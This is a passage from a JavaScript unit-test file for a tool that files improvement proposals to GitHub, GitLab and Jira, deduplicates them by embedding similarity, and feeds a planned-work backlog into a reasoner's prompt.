    const res = await fileProposalToForge({ cli: 'gh', cwd: '/x', title: 'T', body: 'B', slug: 's', exec });
    expect(res.success).toBe(false);
    expect(res.error).toContain('boom');
  });

  it('applyBlockingLabel adds the blocking label via gh edit', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: '' });
    const res = await applyBlockingLabel({ cli: 'gh', cwd: '/x', number: 42, exec });
    expect(res.success).toBe(true);
    expect(exec.mock.calls[0][1]).toEqual(expect.arrayContaining(['edit', '42', '--add-label', LI_BLOCKING_LABEL]));
  });

  it('applyBlockingLabel rejects a non-integer number', async () => {
    const exec = vi.fn();
    const res = await applyBlockingLabel({ cli: 'gh', cwd: '/x', number: null, exec });
    expect(res.success).toBe(false);
    expect(exec).not.toHaveBeenCalled();
  });

  it('PROPOSAL_SCOPES is the full scope set', () => {
    expect(PROPOSAL_SCOPES).toEqual(['app-improvement', 'app-data-gap', 'loop-meta', 'portos-self']);
  });
});

describe('Jira filer', () => {
  it('normalizeJiraState maps only the Done category to closed', () => {
    expect(normalizeJiraState('Done')).toBe('closed');
    expect(normalizeJiraState('done')).toBe('closed');
    expect(normalizeJiraState('In Progress')).toBe('open');
    expect(normalizeJiraState('To Do')).toBe('open');
    expect(normalizeJiraState('')).toBe('open');
    expect(normalizeJiraState(null)).toBe('open');
  });

  it('LI_JIRA_BLOCKING_LABEL is space-and-colon-free (Jira-safe)', () => {
    expect(LI_JIRA_BLOCKING_LABEL).toBe('layered-intelligence-blocking');
    expect(LI_JIRA_BLOCKING_LABEL).not.toMatch(/[\s:]/);
    // The base label is reused verbatim and is already Jira-safe.
    expect(LI_LABEL).not.toMatch(/[\s:]/);
  });

  it('listJiraIssues maps rows and reports ok:true on a successful search', async () => {
    const search = vi.fn().mockResolvedValue([
      { key: 'PROJ-1', summary: 'Do a thing', description: `body ${slugMarker('do-a-thing')}`, statusCategory: 'To Do', resolutiondate: null },
      { key: 'PROJ-2', summary: 'Done thing', description: 'no marker', statusCategory: 'Done', resolutiondate: '2026-07-01T00:00:00.000+0000' }
    ]);
    const res = await listJiraIssues({ instanceId: 'i', projectKey: 'PROJ', search });
    expect(res.ok).toBe(true);
    expect(res.issues[0]).toMatchObject({ number: 'PROJ-1', state: 'open', slug: 'do-a-thing' });
    expect(res.issues[1]).toMatchObject({ number: 'PROJ-2', state: 'closed', closedAt: '2026-07-01T00:00:00.000+0000' });
    // JQL scopes to the project and base LI label.
    expect(search.mock.calls[0][1]).toContain('project = "PROJ"');
    expect(search.mock.calls[0][1]).toContain(`labels = "${LI_LABEL}"`);
  });

  it('listJiraIssues reports ok:false on a thrown search (failed != empty)', async () => {
    const search = vi.fn().mockRejectedValue(new Error('boom'));
    const res = await listJiraIssues({ instanceId: 'i', projectKey: 'PROJ', search });
    expect(res.ok).toBe(false);
    expect(res.issues).toEqual([]);
  });

  it('listJiraIssues reports ok:false when instance/project missing', async () => {
    expect((await listJiraIssues({ instanceId: '', projectKey: 'PROJ' })).ok).toBe(false);
    expect((await listJiraIssues({ instanceId: 'i', projectKey: '' })).ok).toBe(false);
  });

  it('listJiraBlockingIssues filters to the blocking label and non-Done', async () => {
    const search = vi.fn().mockResolvedValue([{ key: 'PROJ-9', summary: 'blocker', statusCategory: 'In Progress' }]);
    const res = await listJiraBlockingIssues({ instanceId: 'i', projectKey: 'PROJ', search });
    expect(res.ok).toBe(true);
    expect(res.issues[0]).toMatchObject({ number: 'PROJ-9', state: 'open' });
    expect(search.mock.calls[0][1]).toContain(`labels = "${LI_JIRA_BLOCKING_LABEL}"`);
    expect(search.mock.calls[0][1]).toContain('statusCategory != Done');
  });

  it('fileProposalToJira embeds the slug marker + LI label and returns the key/url', async () => {
    const create = vi.fn().mockResolvedValue({ success: true, ticketId: 'PROJ-10', url: 'https://j/browse/PROJ-10' });
    const res = await fileProposalToJira({ instanceId: 'i', projectKey: 'PROJ', title: 'T', body: 'B', slug: 'add-x', create });
    expect(res).toEqual({ success: true, key: 'PROJ-10', url: 'https://j/browse/PROJ-10' });
    const payload = create.mock.calls[0][1];
    expect(payload).toMatchObject({ projectKey: 'PROJ', summary: 'T', issueType: 'Task', labels: [LI_LABEL] });
    expect(payload.description).toContain(slugMarker('add-x'));
    expect(payload.description).toContain('B');
  });

  it('fileProposalToJira surfaces a create failure rather than throwing', async () => {
    const create = vi.fn().mockRejectedValue(new Error('403'));
    const res = await fileProposalToJira({ instanceId: 'i', projectKey: 'PROJ', title: 'T', body: 'B', slug: 's', create });
    expect(res.success).toBe(false);
    expect(res.error).toContain('403');
  });

  it('fileProposalToJira refuses when instance/project missing', async () => {
    const res = await fileProposalToJira({ instanceId: '', projectKey: 'PROJ', title: 'T', body: 'B', slug: 's' });
    expect(res.success).toBe(false);
  });

  it('resolveJiraBlockKey resolves "this" to the filed key and an integer to <project>-<n>', () => {
    expect(resolveJiraBlockKey({ blockOnIssue: 'this' }, 'PROJ-10', 'PROJ')).toBe('PROJ-10');
    expect(resolveJiraBlockKey({ blockOnIssue: 42 }, null, 'PROJ')).toBe('PROJ-42');
    // "this" with nothing filed → null; integer with no project → null; no pause → null.
    expect(resolveJiraBlockKey({ blockOnIssue: 'this' }, null, 'PROJ')).toBe(null);
    expect(resolveJiraBlockKey({ blockOnIssue: 42 }, null, '')).toBe(null);
    expect(resolveJiraBlockKey(null, 'PROJ-1', 'PROJ')).toBe(null);
  });

  it('applyJiraBlockingLabel adds the Jira blocking label to the key', async () => {
    const addLabel = vi.fn().mockResolvedValue({ success: true });
    const res = await applyJiraBlockingLabel({ instanceId: 'i', key: 'PROJ-10', addLabel });
    expect(res.success).toBe(true);
    expect(addLabel).toHaveBeenCalledWith('i', 'PROJ-10', [LI_JIRA_BLOCKING_LABEL]);
  });

  it('applyJiraBlockingLabel refuses without a key and surfaces a thrown error', async () => {
    expect((await applyJiraBlockingLabel({ instanceId: 'i', key: null })).success).toBe(false);
    const addLabel = vi.fn().mockRejectedValue(new Error('nope'));
    const res = await applyJiraBlockingLabel({ instanceId: 'i', key: 'PROJ-1', addLabel });
    expect(res.success).toBe(false);
    expect(res.error).toContain('nope');
  });
});

describe('semantic dedup — pure helpers', () => {
  const NOW = Date.parse('2026-07-07T00:00:00Z');

  describe('isIssueWithinDedupWindow', () => {
    it('open issues are always in-window', () => {
      expect(isIssueWithinDedupWindow({ state: 'open' }, NOW)).toBe(true);
    });
    it('recently-closed issues are in-window; long-closed are not', () => {
      const recent = new Date(NOW - 5 * 24 * 60 * 60 * 1000).toISOString();
      const old = new Date(NOW - (CLOSED_SUPPRESSION_MS + 1000)).toISOString();
      expect(isIssueWithinDedupWindow({ state: 'closed', closedAt: recent }, NOW)).toBe(true);
      expect(isIssueWithinDedupWindow({ state: 'closed', closedAt: old }, NOW)).toBe(false);
    });
    it('closed with missing/unparseable close time stays permanently in-window (#2620)', () => {
      // Closed-without-closedAt (a checked `- [x]` PLAN item, or a tracker row
      // missing its close time) is completed work — it must stay suppressed,
      // not become re-proposable.
      expect(isIssueWithinDedupWindow({ state: 'closed' }, NOW)).toBe(true);
      expect(isIssueWithinDedupWindow({ state: 'closed', closedAt: 'not-a-date' }, NOW)).toBe(true);
    });
    it('agrees with isProposalDuplicate on the window boundary', () => {
      const old = new Date(NOW - (CLOSED_SUPPRESSION_MS + 1000)).toISOString();
      const existing = [{ slug: 'add-x', state: 'closed', closedAt: old }];
      expect(isProposalDuplicate({ slug: 'add-x', existingIssues: existing, now: NOW })).toBe(false);
      const recent = new Date(NOW - 1000).toISOString();
      const existing2 = [{ slug: 'add-x', state: 'closed', closedAt: recent }];
      expect(isProposalDuplicate({ slug: 'add-x', existingIssues: existing2, now: NOW })).toBe(true);
    });
  });

  describe('cosineSimilarity', () => {
    it('is 1 for identical vectors and 0 for orthogonal', () => {
      expect(cosineSimilarity([1, 2, 3], [1, 2, 3])).toBeCloseTo(1, 6);
      expect(cosineSimilarity([1, 0], [0, 1])).toBeCloseTo(0, 6);
    });
    it('returns 0 (not NaN) for shape mismatch, empty, or zero-magnitude vectors', () => {
      expect(cosineSimilarity([1, 2], [1, 2, 3])).toBe(0);
      expect(cosineSimilarity([], [])).toBe(0);
      expect(cosineSimilarity([0, 0], [1, 1])).toBe(0);
      expect(cosineSimilarity('x', [1])).toBe(0);
    });
  });

  describe('issueEmbedSeed', () => {
    it('joins trimmed title + body and caps length', () => {
      expect(issueEmbedSeed({ title: ' T ', body: ' B ' })).toBe('T\n\nB');
      expect(issueEmbedSeed({ title: '', body: 'only body' })).toBe('only body');
      expect(issueEmbedSeed({}).length).toBe(0);
      expect(issueEmbedSeed({ title: 'x'.repeat(5000) }).length).toBe(2000);
    });
  });

  describe('findSemanticDuplicate', () => {
    it('returns the highest-scoring candidate above threshold', () => {
      const p = [1, 0, 0];
      const candidates = [
        { slug: 'low', embedding: [0, 1, 0] },      // orthogonal → 0
        { slug: 'high', number: 9, embedding: [1, 0, 0] }, // identical → 1
      ];
      const match = findSemanticDuplicate({ proposalEmbedding: p, candidates, threshold: 0.9 });
      expect(match.slug).toBe('high');
      expect(match.number).toBe(9);
      expect(match.score).toBeCloseTo(1, 6);
    });
    it('returns null when nothing meets threshold, or the proposal embedding is unusable', () => {
      expect(findSemanticDuplicate({ proposalEmbedding: [1, 0], candidates: [{ embedding: [0, 1] }], threshold: 0.9 })).toBe(null);
      expect(findSemanticDuplicate({ proposalEmbedding: [], candidates: [{ embedding: [1] }] })).toBe(null);
      expect(findSemanticDuplicate({ proposalEmbedding: [1], candidates: [{ embedding: [] }, {}] })).toBe(null);
    });
  });
});

describe('checkSemanticDuplicate — I/O wrapper', () => {
  const NOW = Date.parse('2026-07-07T00:00:00Z');
  const ok = (embedding) => ({ success: true, embedding });
  const proposal = { title: 'Introduce widget', body: 'add it' };

  it('is unavailable (never suppresses) when there are no embeddable candidates', async () => {
    const embed = vi.fn(async () => ok([1, 0, 0]));
    // plan-style slug-only issue has no title/body to embed
    const res = await checkSemanticDuplicate({ proposal, existingIssues: [{ slug: 's', state: 'open' }], now: NOW, embed });
    expect(res).toEqual({ available: false, duplicate: false, match: null });
    expect(embed).not.toHaveBeenCalled();
  });

  it('is unavailable when the embeddings provider is off (skipped proposal embed)', async () => {
    const embed = vi.fn(async () => ({ skipped: true, reason: 'provider-disabled' }));
    const existing = [{ number: 3, title: 'Add widget', body: 'x', state: 'open' }];
    const res = await checkSemanticDuplicate({ proposal, existingIssues: existing, now: NOW, embed });
    expect(res.available).toBe(false);
    expect(res.duplicate).toBe(false);
  });

  it('degrades to unavailable (never rejects) on an async rejection OR a synchronous throw', async () => {
    const existing = [{ number: 3, title: 'Add widget', body: 'x', state: 'open' }];
    const asyncThrow = vi.fn(async () => { throw new Error('provider down'); });
    expect(await checkSemanticDuplicate({ proposal, existingIssues: existing, now: NOW, embed: asyncThrow }))
      .toEqual({ available: false, duplicate: false, match: null });
    // A non-async embedder that throws synchronously must also degrade, not reject.
    const syncThrow = vi.fn(() => { throw new Error('sync boom'); });
    expect(await checkSemanticDuplicate({ proposal, existingIssues: existing, now: NOW, embed: syncThrow }))
      .toEqual({ available: false, duplicate: false, match: null });
  });

  it('flags a near-duplicate when a candidate embedding is close enough', async () => {
    const embed = vi.fn(async () => ok([1, 0, 0])); // proposal + candidate both identical → score 1
    const existing = [{ number: 3, slug: 'add-widget', title: 'Add widget', body: 'x', state: 'open' }];
    const res = await checkSemanticDuplicate({ proposal, existingIssues: existing, now: NOW, embed });
    expect(res.available).toBe(true);
    expect(res.duplicate).toBe(true);
    expect(res.match.number).toBe(3);
  });

  it('checks but finds no duplicate when candidates are dissimilar', async () => {
    const embed = vi.fn(async (text) => ok(text === issueEmbedSeed({ title: proposal.title, body: proposal.body }) ? [1, 0, 0] : [0, 1, 0]));
    const existing = [{ number: 3, title: 'Unrelated', body: 'y', state: 'open' }];
    const res = await checkSemanticDuplicate({ proposal, existingIssues: existing, now: NOW, embed });
    expect(res.available).toBe(true);
    expect(res.duplicate).toBe(false);
    expect(res.match).toBe(null);
  });

  it('ignores long-closed candidates (out of the dedup window)', async () => {
    const embed = vi.fn(async () => ok([1, 0, 0]));
    const old = new Date(NOW - (CLOSED_SUPPRESSION_MS + 1000)).toISOString();
    const existing = [{ number: 3, title: 'Add widget', body: 'x', state: 'closed', closedAt: old }];
    const res = await checkSemanticDuplicate({ proposal, existingIssues: existing, now: NOW, embed });
    expect(res.available).toBe(false);
    expect(embed).not.toHaveBeenCalled();
  });

  it('caps the number of candidates embedded per run', async () => {
    const embed = vi.fn(async () => ok([0, 1, 0])); // dissimilar so nothing matches
    const existing = Array.from({ length: SEMANTIC_DEDUP_MAX_CANDIDATES + 20 }, (_, i) => ({ number: i, title: `t${i}`, body: 'b', state: 'open' }));
    await checkSemanticDuplicate({ proposal, existingIssues: existing, now: NOW, embed });
    // 1 proposal embed + at most SEMANTIC_DEDUP_MAX_CANDIDATES candidate embeds
    expect(embed.mock.calls.length).toBe(SEMANTIC_DEDUP_MAX_CANDIDATES + 1);
  });

  it('respects the threshold constant default', () => {
    expect(SEMANTIC_DEDUP_THRESHOLD).toBeGreaterThan(0);
    expect(SEMANTIC_DEDUP_THRESHOLD).toBeLessThanOrEqual(1);
  });
});

describe('listForgeIssues url surfacing (issue #2293)', () => {
  it('surfaces gh `url` on each issue', async () => {
    const exec = vi.fn().mockResolvedValue({
      code: 0,
      stdout: JSON.stringify([{ number: 12, title: 'A', body: 'x', state: 'OPEN', url: 'https://github.com/o/r/issues/12' }])
    });
    const { issues } = await listForgeIssues({ cli: 'gh', cwd: '/x', exec });
    expect(issues[0].url).toBe('https://github.com/o/r/issues/12');
  });

  it('maps GitLab `web_url` to url', async () => {
    const exec = vi.fn().mockResolvedValue({
      code: 0,
      stdout: JSON.stringify([{ iid: 9, title: 'G', description: 'd', state: 'opened', web_url: 'https://gitlab.com/o/r/-/issues/9' }])
    });
    const { issues } = await listForgeIssues({ cli: 'glab', cwd: '/x', exec });
    expect(issues[0].url).toBe('https://gitlab.com/o/r/-/issues/9');
  });

  it('defaults url to null when neither field is present', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: JSON.stringify([{ number: 1, title: 'A', body: 'x', state: 'OPEN' }]) });
    const { issues } = await listForgeIssues({ cli: 'gh', cwd: '/x', exec });
    expect(issues[0].url).toBeNull();
  });
});

describe('gatherSources cosMetrics windowed rate (issue #2460)', () => {
  let dir;
  beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), 'lil-cosmetrics-')); });
  afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

  const writeLearning = (learning) => writeFile(join(dir, 'learning.json'), JSON.stringify(learning));

  it('surfaces a recency-windowed rate distinct from the lifetime rate', async () => {
    const now = Date.now();
    const DAY = 24 * 60 * 60 * 1000;
    // Lifetime rate is dragged down by an old failure burst; the recent ring is
    // all successes → windowed rate should read high while lifetime reads low.
    await writeLearning({
      byTaskType: {
        'self-improve:ui': {
          completed: 12, succeeded: 2, failed: 10, successRate: 17, avgDurationMs: 1000,
          recentOutcomes: [
            { t: new Date(now - 40 * DAY).toISOString(), s: false }, // aged out of the 30d window
            { t: new Date(now - 2 * DAY).toISOString(), s: true },
            { t: new Date(now - 1 * DAY).toISOString(), s: true }
          ]
        }
      }
    });
    const out = await gatherSources({ repoPath: dir }, { sources: { cosMetrics: true } }, { cosPath: dir });
    const parsed = JSON.parse(out.cosMetrics);
    expect(parsed['self-improve:ui'].lifetimeSuccessRate).toBe(17);
    expect(parsed['self-improve:ui'].lifetimeCompleted).toBe(12);
    expect(parsed['self-improve:ui'].recentSuccessRate).toBe(100);
    expect(parsed['self-improve:ui'].recentCompleted).toBe(2);
  });

  it('reports a null recentSuccessRate (not 0) when the ring is empty so LI leans on lifetime', async () => {
    await writeLearning({
      byTaskType: {
        'idle-review': { completed: 5, succeeded: 5, failed: 0, successRate: 100, recentOutcomes: [] }
      }
    });
    const out = await gatherSources({ repoPath: dir }, { sources: { cosMetrics: true } }, { cosPath: dir });
    const parsed = JSON.parse(out.cosMetrics);
    expect(parsed['idle-review'].recentSuccessRate).toBeNull();
    expect(parsed['idle-review'].lifetimeSuccessRate).toBe(100);
  });

  it('tolerates a pre-migration bucket with no recentOutcomes key', async () => {
    await writeLearning({
      byTaskType: { 'auto-fix': { completed: 3, succeeded: 1, failed: 2, successRate: 33 } }
    });
    const out = await gatherSources({ repoPath: dir }, { sources: { cosMetrics: true } }, { cosPath: dir });
    const parsed = JSON.parse(out.cosMetrics);
    expect(parsed['auto-fix'].recentSuccessRate).toBeNull();
    expect(parsed['auto-fix'].lifetimeSuccessRate).toBe(33);
  });

  it('does not read learning.json when cosMetrics is off', async () => {
    await writeLearning({ byTaskType: { x: { successRate: 50, recentOutcomes: [] } } });
    const out = await gatherSources({ repoPath: dir }, { sources: { cosMetrics: false } }, { cosPath: dir });
    expect(out.cosMetrics).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// plannedWork source (#2698) — the committed backlog fed to the reasoner so it
// can suppress a proposal that overlaps work already in scope.
// ---------------------------------------------------------------------------

describe('normalizeIssueLabels', () => {
  it('reads gh label objects and glab label strings alike', () => {
    expect(normalizeIssueLabels([{ name: 'plan' }, { name: 'p1' }])).toEqual(['plan', 'p1']);
    expect(normalizeIssueLabels(['plan', 'p1'])).toEqual(['plan', 'p1']);
  });

  it('drops junk rather than rendering [object Object] into the prompt', () => {
    expect(normalizeIssueLabels([{ color: 'red' }, null, '', '  ', 42, { name: ' ok ' }])).toEqual(['ok']);
  });

  it('returns [] for a non-array (never throws)', () => {
    expect(normalizeIssueLabels(undefined)).toEqual([]);
    expect(normalizeIssueLabels('plan')).toEqual([]);
  });
});

describe('extractIssuePriority', () => {
  it('reads the common priority label conventions', () => {
    expect(extractIssuePriority(['bug', 'priority: high'])).toBe('high');
    expect(extractIssuePriority(['priority/critical'])).toBe('critical');
    expect(extractIssuePriority(['P0'])).toBe('p0');
    expect(extractIssuePriority(['high-priority'])).toBe('high');
    expect(extractIssuePriority([{ name: 'low' }])).toBe('low');
  });

  it('returns null when no label looks like a priority (absent ≠ p0)', () => {
    expect(extractIssuePriority(['plan', 'enhancement'])).toBeNull();
    expect(extractIssuePriority([])).toBeNull();
    expect(extractIssuePriority(undefined)).toBeNull();
    // A near-miss must not be coerced into a priority.
    expect(extractIssuePriority(['p9', 'priority'])).toBeNull();
  });
});

describe('extractPlannedPlanItems', () => {
  it('extracts unchecked items only — a done item is not pending work', () => {
    const plan = [
      '# Plan',
      '## Next Up',
      '- [ ] Add a widget',
      '- [x] Already shipped',
      '* [ ] Star bullet item',
      'not a list item'
    ].join('\n');
    expect(extractPlannedPlanItems(plan).map(i => i.title)).toEqual(['Add a widget', 'Star bullet item']);
  });

  it('collapses whitespace and yields the planned-item shape', () => {
    expect(extractPlannedPlanItems('- [ ]   Do    the   thing  ')[0]).toEqual({
      number: null, title: 'Do the thing', labels: [], priority: null
    });
  });

  it('returns [] for a non-string or an empty/checkbox-less plan', () => {
    expect(extractPlannedPlanItems(null)).toEqual([]);
    expect(extractPlannedPlanItems('# Plan\n\nJust prose.')).toEqual([]);
    // A checkbox with no text is not an item.
    expect(extractPlannedPlanItems('- [ ]   ')).toEqual([]);
  });
});

describe('formatPlannedWork', () => {
  it('renders number, title, priority and labels', () => {
    const out = formatPlannedWork([{ number: 12, title: 'Ship X', labels: ['plan', 'p1'], priority: 'p1' }]);
    expect(out).toContain('- #12 Ship X');
    expect(out).toContain('priority: p1');
    expect(out).toContain('labels: plan, p1');
  });

  it('omits the priority/labels parens when there is nothing to say', () => {
    const out = formatPlannedWork([{ number: null, title: 'Bare item', labels: [], priority: null }]);
    const itemLine = out.split('\n').find(l => l.startsWith('- '));
    expect(itemLine).toBe('- Bare item');
  });

  it('reports the FULL count when truncating so a partial list never reads as the whole backlog', () => {
    const many = Array.from({ length: 40 }, (_, n) => ({ number: n + 1, title: `Item ${n + 1}`, labels: [], priority: null }));
    const out = formatPlannedWork(many);
    expect(out).toContain('40 items');
    expect(out).toContain(`showing the top ${PLANNED_WORK_MAX_ITEMS}`);
    expect(out).toContain('- #15 Item 15');
    expect(out).not.toContain('Item 16');
  });

  it('bounds the rendered block', () => {
    const many = Array.from({ length: 15 }, (_, n) => ({ number: n, title: 'x'.repeat(2000), labels: [], priority: null }));
    expect(formatPlannedWork(many).length).toBeLessThanOrEqual(8000);
  });

  it('says "nothing planned" EXPLICITLY for a real empty result (not an omitted block)', () => {
    expect(formatPlannedWork([])).toBe(PLANNED_WORK_NONE);
    expect(formatPlannedWork(undefined)).toBe(PLANNED_WORK_NONE);
    expect(PLANNED_WORK_NONE).toContain('read successfully');
  });
});

describe('plannedWorkUnavailable', () => {
  it('tells the reasoner NOT to read a failed read as "nothing planned"', () => {
    const msg = plannedWorkUnavailable('the gh issue list failed');
    expect(msg).toContain('could NOT be read');
    expect(msg).toContain('the gh issue list failed');
    // The whole point of the sentinel: it must be distinguishable from the
    // legitimately-empty rendering.
    expect(msg).not.toBe(PLANNED_WORK_NONE);
  });
});

describe('hasPlannedWorkListing', () => {
  it('is true only for a real backlog listing', () => {
    expect(hasPlannedWorkListing('2 item(s) of actively-planned work:\n- #3 Ship X')).toBe(true);
  });

  it('is false for BOTH sentinels — neither is a backlog to go review', () => {
    // "nothing is planned" and "could not be read" both render in the prompt and
    // both mean something, but telling the reasoner "review the plannedWork source
    // — you may be overlapping committed work" under either is a contradiction.
    expect(hasPlannedWorkListing(PLANNED_WORK_NONE)).toBe(false);
    expect(hasPlannedWorkListing(plannedWorkUnavailable('the gh issue list failed'))).toBe(false);
  });

  it('is false for an absent / blank / non-string source', () => {
    expect(hasPlannedWorkListing(undefined)).toBe(false);
    expect(hasPlannedWorkListing(null)).toBe(false);
    expect(hasPlannedWorkListing('   ')).toBe(false);
    expect(hasPlannedWorkListing(['#3'])).toBe(false);
  });

  it('tracks the sentinels through their constructors (no drifting copy of the text)', () => {
    expect(plannedWorkUnavailable('x').startsWith(PLANNED_WORK_UNAVAILABLE_PREFIX)).toBe(true);
  });
});

describe('plannedWorkJql', () => {
  it('filters to not-Done plan-labeled tickets and orders by priority', () => {
    const jql = plannedWorkJql('PROJ');
    expect(jql).toContain('project = "PROJ"');
    expect(jql).toContain('statusCategory != Done');
    expect(jql).toContain('ORDER BY priority DESC');
  });

  it('filters on the plan label — parity with the forge, not "every open ticket"', () => {
    // Without this the source would return the whole untriaged backlog under a
    // header claiming the user committed to it, and tell the reasoner to suppress
    // against essentially the entire tracker.
    expect(plannedWorkJql('PROJ')).toContain(`labels = "${PLANNED_WORK_LABEL}"`);
  });

  it('does NOT reference openSprints or filter on priority NAMES (both hard-400 on some projects)', () => {
    const jql = plannedWorkJql('PROJ');
    expect(jql).not.toContain('openSprints');
    expect(jql).not.toContain('priority in');
  });

  it('escapes the project key', () => {
    expect(plannedWorkJql('A"B')).toContain('A\\"B');
  });
});

describe('gatherPlannedWork', () => {
  it('forge: queries the plan label + open state and summarizes with derived priority', async () => {
    const listForge = vi.fn().mockResolvedValue({
      ok: true,
      issues: [
        { number: 3, title: 'Planned A', state: 'open', labels: ['plan', 'priority: high'] },
        { number: 4, title: 'Planned B', state: 'open', labels: ['plan'] }
      ]
    });
    const out = await gatherPlannedWork({ filer: 'forge', forgeCli: 'gh', cwd: '/repo', listForge });
    expect(listForge).toHaveBeenCalledWith({ cli: 'gh', cwd: '/repo', label: PLANNED_WORK_LABEL, state: 'open' });
    expect(out).toContain('- #3 Planned A');
    expect(out).toContain('priority: high');
    expect(out).toContain('- #4 Planned B');
  });

  it('forge: filters out a closed issue the tracker still returned', async () => {
    const listForge = vi.fn().mockResolvedValue({
      ok: true,
      issues: [
        { number: 3, title: 'Open one', state: 'open', labels: [] },
        { number: 5, title: 'Done one', state: 'closed', labels: [] }
      ]
    });
    const out = await gatherPlannedWork({ filer: 'forge', forgeCli: 'glab', cwd: '/repo', listForge });
    expect(out).toContain('Open one');
    expect(out).not.toContain('Done one');
    expect(out).toContain('1 item(s)');
  });

  it('forge: a FAILED read renders the unavailable sentinel, NOT "nothing planned"', async () => {
    const listForge = vi.fn().mockResolvedValue({ ok: false, issues: [] });
    const out = await gatherPlannedWork({ filer: 'forge', forgeCli: 'gh', cwd: '/repo', listForge });
    expect(out).toContain('could NOT be read');
    expect(out).not.toBe(PLANNED_WORK_NONE);
  });

  it('forge: a SUCCESSFUL empty read renders "nothing planned" (distinct from a failure)', async () => {
    const listForge = vi.fn().mockResolvedValue({ ok: true, issues: [] });
    expect(await gatherPlannedWork({ filer: 'forge', forgeCli: 'gh', cwd: '/repo', listForge })).toBe(PLANNED_WORK_NONE);
  });

  it('jira: uses the planned-work JQL, requests the priority field, and prefers it over labels', async () => {
    const listJira = vi.fn().mockResolvedValue({
      ok: true,
      issues: [{ number: 'PROJ-9', title: 'Jira item', state: 'open', labels: ['low'], priority: 'Highest' }]
    });
    const out = await gatherPlannedWork({
      filer: 'jira', jira: { instanceId: 'i1', projectKey: 'PROJ' }, listJira
    });
    const arg = listJira.mock.calls[0][0];
    expect(arg.jql).toBe(plannedWorkJql('PROJ'));
    expect(arg.searchOptions.fields).toContain('priority');
    // Jira's real priority field wins over the label-derived fallback.
    expect(out).toContain('priority: Highest');
    expect(out).toContain('- #PROJ-9 Jira item');
  });

  it('jira: falls back to a label-derived priority when the field is absent', async () => {
    const listJira = vi.fn().mockResolvedValue({
      ok: true,
      issues: [{ number: 'PROJ-9', title: 'J', state: 'open', labels: ['p2'], priority: null }]
    });
    const out = await gatherPlannedWork({ filer: 'jira', jira: { instanceId: 'i1', projectKey: 'PROJ' }, listJira });
    expect(out).toContain('priority: p2');
  });

  it('jira: a FAILED search renders the unavailable sentinel', async () => {
    const listJira = vi.fn().mockResolvedValue({ ok: false, issues: [] });
    const out = await gatherPlannedWork({ filer: 'jira', jira: { instanceId: 'i1', projectKey: 'PROJ' }, listJira });
    expect(out).toContain('could NOT be read');
  });

  it('returns null when the tracker coords are unusable (source simply does not apply)', async () => {
    expect(await gatherPlannedWork({ filer: 'forge', forgeCli: null, cwd: '/repo' })).toBeNull();
    expect(await gatherPlannedWork({ filer: 'jira', jira: null })).toBeNull();
    expect(await gatherPlannedWork({ filer: 'plan', cwd: null })).toBeNull();
    expect(await gatherPlannedWork({})).toBeNull();
  });

  describe('plan tracker', () => {
    let dir;
    beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), 'lil-planned-')); });
    afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

    it('summarizes PLAN.md unchecked items', async () => {
      await writeFile(join(dir, 'PLAN.md'), '# P\n- [ ] Committed thing\n- [x] Done thing\n');
      const out = await gatherPlannedWork({ filer: 'plan', cwd: dir });
      expect(out).toContain('- Committed thing');
      expect(out).not.toContain('Done thing');
    });

    it('an ABSENT PLAN.md is a real "nothing planned"', async () => {
      expect(await gatherPlannedWork({ filer: 'plan', cwd: dir })).toBe(PLANNED_WORK_NONE);
    });

    it('a PRESENT-but-unreadable PLAN.md is a FAILURE, not "nothing planned"', async () => {
      await writeFile(join(dir, 'PLAN.md'), '- [ ] x');
      // tryReadFile collapses every failure to null; the existsSync probe is what
      // keeps "unreadable" from masquerading as "no plan at all".
      const out = await gatherPlannedWork({ filer: 'plan', cwd: dir, readFileFn: async () => null });
      expect(out).toContain('could NOT be read');
      expect(out).not.toBe(PLANNED_WORK_NONE);
    });
  });
});

describe('gatherSources plannedWork wiring (#2698)', () => {
  let dir;
  beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), 'lil-pw-src-')); });
  afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

  it('gathers plannedWork when the source is on and a tracker is supplied', async () => {
    await writeFile(join(dir, 'PLAN.md'), '- [ ] Committed thing\n');
    const out = await gatherSources(
      { repoPath: dir },
      { sources: { plannedWork: true } },
      { tracker: { filer: 'plan', cwd: dir } }
    );
    expect(out.plannedWork).toContain('Committed thing');
  });

  it('skips plannedWork when the source is off', async () => {
    await writeFile(join(dir, 'PLAN.md'), '- [ ] Committed thing\n');
    const out = await gatherSources(
      { repoPath: dir },
      { sources: { plannedWork: false } },
      { tracker: { filer: 'plan', cwd: dir } }
    );
    expect(out.plannedWork).toBeUndefined();
  });

  it('skips plannedWork when no tracker context was resolved', async () => {
    await writeFile(join(dir, 'PLAN.md'), '- [ ] Committed thing\n');
    const out = await gatherSources({ repoPath: dir }, { sources: { plannedWork: true } });
    expect(out.plannedWork).toBeUndefined();
  });

  it('is on by default for every app', () => {
    expect(defaultLayeredIntelligenceConfig(false).sources.plannedWork).toBe(true);
    expect(defaultLayeredIntelligenceConfig(true).sources.plannedWork).toBe(true);
  });

  it('reaches an existing install that stored sources before the key existed', () => {
    // getEffectiveConfig spreads defaults under stored sources, so no migration
    // is needed for the new key — but an explicit opt-out must still survive.
    const stored = { layeredIntelligence: { sources: { goals: false } } };
    expect(getEffectiveConfig(stored).sources.plannedWork).toBe(true);
    const optedOut = { layeredIntelligence: { sources: { plannedWork: false } } };
    expect(getEffectiveConfig(optedOut).sources.plannedWork).toBe(false);
  });
});

describe('buildPrompt plannedWork block (#2698)', () => {
  const app = { name: 'App' };
  const config = { allowedScopes: ['app-improvement'], sources: {} };

  it('renders the block with the cross-reference guidance attached', () => {
    const p = buildPrompt({ app, config, sources: { plannedWork: '1 item(s):\n- #3 Ship X' } });
    expect(p).toContain('### plannedWork');
    expect(p).toContain('- #3 Ship X');
    expect(p).toContain(PLANNED_WORK_GUIDANCE);
    expect(p).toContain('DO NOT file — return proposal: null');
  });

  it('renders plannedWork ONCE — not also inside the generic source list', () => {
    const p = buildPrompt({ app, config, sources: { goals: 'be great', plannedWork: 'PLANNED BACKLOG' } });
    expect(p.match(/### plannedWork/g)).toHaveLength(1);
